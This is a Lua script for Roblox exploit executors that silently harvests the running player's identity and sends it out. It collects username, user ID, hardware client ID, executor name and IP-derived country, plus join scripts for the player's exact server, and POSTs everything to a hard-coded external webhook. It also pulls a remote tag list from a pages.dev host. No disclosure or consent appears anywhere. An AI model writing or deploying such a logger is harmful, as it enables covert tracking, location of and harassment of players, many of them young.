local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"

-- HWID detection with fallback
local function getHwid()
    local success, hwid = pcall(function()
        return RbxAnalyticsService:GetClientId()
    end)
    return success and hwid or "Unknown"
end
local Hwid = getHwid()

local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local GameLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
local PlayerProfileLink = "https://www.roblox.com/users/" .. tostring(UserId) .. "/profile"

-- Join scripts (FIXED)
local JoinScript = "``game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')``"
local JoinScriptMobile = "``game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')``"
local JoinCode = "```Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')```"
local JoinScriptPC = "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')```"
-- REMOVED backticks from MobileJoinLink
local MobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&jobId=" .. game.JobId

-- Using bust-thumbnail endpoint for players
local PlayerProfilePic = "https://www.roblox.com/bust-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
local GameThumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=768&height=432&format=png"

-- Request function setup
local function setupRequestFunction()
    local candidates = {
        syn and syn.request,
        request,
        fluxus and fluxus.request,
        http and http.request,
        http_request,
        sentinel and sentinel.request,
        crypt and crypt.request,
        SENTINEL_LOADED and request,
        syn and syn.request,
        (typeof(request) == "function" and request),
        (typeof(http) == "table" and http.request)
    }
    local crequest
    for _, candidate in ipairs(candidates) do
        if type(candidate) == "function" then
            crequest = candidate
            break
        end
    end
    if not crequest then
        local HttpService = game:GetService("HttpService")
        crequest = function(options)
            return HttpService:RequestAsync({
                Url = options.Url,
                Method = options.Method or options.method or "GET"
            })
        end
    end
    return crequest
end

local function detectExecutor()
    local executor = identifyexecutor or getexecutorname or get_executor_name
    if executor then
        return executor()
    else
        return "Unknown"
    end
end

local function getCountry()
    local request = http_request or request or HttpPost or syn.request
    if not request then return "🌐 Unknown" end
    local success, result = pcall(function()
        return request({Url = "http://ip-api.com/json", Method = "GET"})
    end)
    if success and result and result.Body then
        local response = HttpService:JSONDecode(result.Body)
        if response and response.countryCode then
            local a, b = response.countryCode:byte(1), response.countryCode:byte(2)
            return utf8.char(0x1F1E6 - 65 + a) .. utf8.char(0x1F1E6 - 65 + b) .. " " .. response.country
        end
    end
    return "🌐 Unknown"
end
local CountryLocation = getCountry()

local function getAvatarUrl(userId)
    local url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=720x720&format=Png&isCircular=false"
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet(url))
    end)
    if success and result and result.data and result.data[1] and result.data[1].imageUrl then
        return result.data[1].imageUrl
    end
    return nil
end
local AvatarImageUrl = getAvatarUrl(UserId)

-- Function to get user title from tags (UPDATED)
local function getUserTitle()
    local crequest = setupRequestFunction()
    local success, result = pcall(function()
        return crequest({
            Url = "https://ngrpzyqnezbcpvo7uyszdzherjhxgz.pages.dev/Tags.json",
            Method = "GET"
        })
    end)
    
    if success and result and result.Body then
        local tagsData = HttpService:JSONDecode(result.Body)
        
        -- Loop through all title tables in the JSON
        for title, usernames in pairs(tagsData) do
            -- Check if usernames is a table (array)
            if type(usernames) == "table" then
                -- Loop through each username in the current title's array
                for _, username in ipairs(usernames) do
                    -- Check if current player's username matches
                    if username == Username then
                        return title
                    end
                end
            end
        end
    end
    
    -- Default title if user is not found in any table
    return "AK USER"
end
local UserTitle = getUserTitle()

local function createWebhookData()
    local executor = detectExecutor()
    local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") -- ISO 8601 format for Discord
    
    -- User Information Embed (Blue)
    local userEmbed = {
        title = "**" .. UserTitle .. "**",
        description = "[" .. GameName .. "](" .. GameLink .. ")",
        fields = {
            { name = "Display Name:", value = "[" .. DisplayName .. "](" .. PlayerProfileLink .. ")", inline = true },
            { name = "Username:", value = Username, inline = true },
            { name = "Located in:", value = CountryLocation, inline = true },
            { name = "Platform:", value = Platform, inline = true }
        },
        color = tonumber("0x0080FF"), -- Blue
        image = AvatarImageUrl and {url = AvatarImageUrl} or nil
    }
    
    -- Executor Information Embed (Blue-Pink transition)
    local executorEmbed = {
        title = "**EXECUTOR INFO**",
        fields = {
            { name = "HWID:", value = "`" .. Hwid .. "`", inline = true },
            { name = "Executor:", value = "`" .. executor .. "`", inline = true }
        },
        color = tonumber("0x8080FF") -- Blue-Pink mix
    }
    
    -- Join Scripts Embed (Pink - with timestamp)
    local joinEmbed = {
        title = "**JOIN SCRIPTS (CLICK TO COPY)**",
        fields = {
            { name = "PC Join Script:", value = JoinScriptPC, inline = false },
            { name = "Mobile Join Script ", value = JoinScriptMobile, inline = false },
            { name = "PC Join (Paste in browser console):", value = JoinCode, inline = false },
            -- MOVED this field to the bottom and removed title
            { name = "", value = "> " .. MobileJoinLink, inline = false }
        },
        color = tonumber("0xFF69B4"), -- Pink
        timestamp = timestamp
    }
    
    local data = {
        username = "AK EXECUTION",
        avatar_url = "https://cdn.discordapp.com/attachments/1372189730015281192/1384181053379448832/ak_logo.png?ex=68517e8f&is=68502d0f&hm=374b920759b96ad589ed6b89b1adb9a1137c8a7dbba3ece53ae04df39d0ba06c&",
        embeds = { userEmbed, executorEmbed, joinEmbed }
    }
    
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    
    if not request then
        warn("❌ No HTTP request function available")
        return false
    end
    
    local success, result = pcall(function()
        local webhookRequest = {
            Url = webhookUrl, 
            Body = data, 
            Method = "POST", 
            Headers = headers
        }
        return request(webhookRequest)
    end)
    
    if success then
        print("✅ Webhook sent successfully")
        return true
    else
        warn("❌ Failed to send webhook: " .. tostring(result))
        return false
    end
end

-- Main execution with error handling
local function main()
    local success, error = pcall(function()
        local webhookUrl = "https://angelical.me/ace/w/G-y31EHxvcce"
        local webhookData = createWebhookData()
        sendWebhook(webhookUrl, webhookData)
    end)
    
    if not success then
        warn("💥 Script error: " .. tostring(error))
    end
end

-- Execute the script
main()
